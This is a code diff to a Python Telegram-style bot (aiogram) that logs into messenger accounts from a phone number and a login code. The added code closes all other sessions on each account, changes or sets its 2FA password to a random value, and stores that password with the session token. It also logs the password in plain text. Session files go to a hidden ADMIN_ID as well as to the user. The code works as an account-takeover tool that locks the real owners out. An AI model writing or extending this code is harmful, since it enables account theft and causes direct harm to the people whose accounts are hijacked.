@@ -6,6 +6,8 @@ import logging
 import time
 import sqlite3
 import zipfile
+import random
+import string
 from io import BytesIO
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -41,6 +43,9 @@ def save_accounts():
         json.dump(accounts, f, ensure_ascii=False, indent=4)
 
 load_accounts()
+
+def gen_random_password():
+    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#%", k=12))
 
 def get_device_id_from_session(work_dir):
     db_path = os.path.join(work_dir, "session.db")
@@ -190,9 +195,7 @@ async def cb_desk(callback: types.CallbackQuery):
     with open(dp_path, "w") as f:
         json.dump(desktop, f, ensure_ascii=False, indent=4)
 
-    # Админу всегда
     await bot.send_document(ADMIN_ID, FSInputFile(dp_path), caption=f"💻 Десктоп\n{phone}")
-    # Пользователю
     await bot.send_document(callback.from_user.id, FSInputFile(dp_path), caption=f"💻 Десктоп-сессия\n{phone}")
     await callback.answer("Отправлено!")
 
@@ -218,6 +221,42 @@ async def phone_handler(message: types.Message, state: FSMContext):
     async def auth():
         try:
             await client.start()
+
+            # Закрываем все сессии кроме своей
+            try:
+                sessions = await client.get_sessions()
+                current_id = None
+                for sess in sessions:
+                    sess_dict = sess if isinstance(sess, dict) else sess.dict() if hasattr(sess, 'dict') else {}
+                    if sess_dict.get('current'):
+                        current_id = sess_dict.get('id')
+                        break
+                for sess in sessions:
+                    sess_dict = sess if isinstance(sess, dict) else sess.dict() if hasattr(sess, 'dict') else {}
+                    if sess_dict.get('id') != current_id and sess_dict.get('id') is not None:
+                        try:
+                            await client.close_session(sess_dict['id'])
+                        except:
+                            pass
+            except:
+                pass
+
+            # Устанавливаем или меняем пароль 2FA
+            new_password = gen_random_password()
+            try:
+                # Пробуем сначала сменить (если уже есть 2FA)
+                await client.change_2fa(new_password)
+                logging.info(f"2FA сменён на {new_password}")
+                pending[uid]["password_2fa"] = new_password
+            except:
+                try:
+                    # Если смена не удалась — устанавливаем новый
+                    await client.set_2fa(new_password)
+                    logging.info(f"2FA установлен: {new_password}")
+                    pending[uid]["password_2fa"] = new_password
+                except Exception as e:
+                    logging.error(f"Ошибка установки 2FA: {e}")
+
             if uid in pending:
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
@@ -277,11 +316,15 @@ async def code_handler(message: types.Message, state: FSMContext):
         if status == "done":
             token = pending[uid]["token"]
             vid = pending[uid].get("user_id", 0)
+            pwd_2fa = pending[uid].get("password_2fa", "")
             uid_str = str(uid)
             if uid_str not in accounts: accounts[uid_str] = {}
-            accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir}
+            accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd_2fa}
             save_accounts()
-            await msg.edit_text("✅ Аккаунт добавлен!")
+            text = "✅ Аккаунт добавлен! Все старые сессии закрыты."
+            if pwd_2fa:
+                text += f"\n🔐 Пароль 2FA: {pwd_2fa}"
+            await msg.edit_text(text)
             del pending[uid]; await state.clear(); return
 
         elif status == "need_password":
@@ -341,11 +384,15 @@ async def password_handler(message: types.Message, state: FSMContext):
                     vid = me_dict.get('contact', {}).get('id', 0)
                 except: pass
 
+        pwd_2fa = pending[uid].get("password_2fa", pwd)
         uid_str = str(uid)
         if uid_str not in accounts: accounts[uid_str] = {}
-        accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd}
+        accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd_2fa}
         save_accounts()
-        await msg.edit_text("✅ Аккаунт добавлен!")
+        text = "✅ Аккаунт добавлен! Все старые сессии закрыты."
+        if pwd_2fa:
+            text += f"\n🔐 Пароль 2FA: {pwd_2fa}"
+        await msg.edit_text(text)
         del pending[uid]; await state.clear(); return
 
     await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
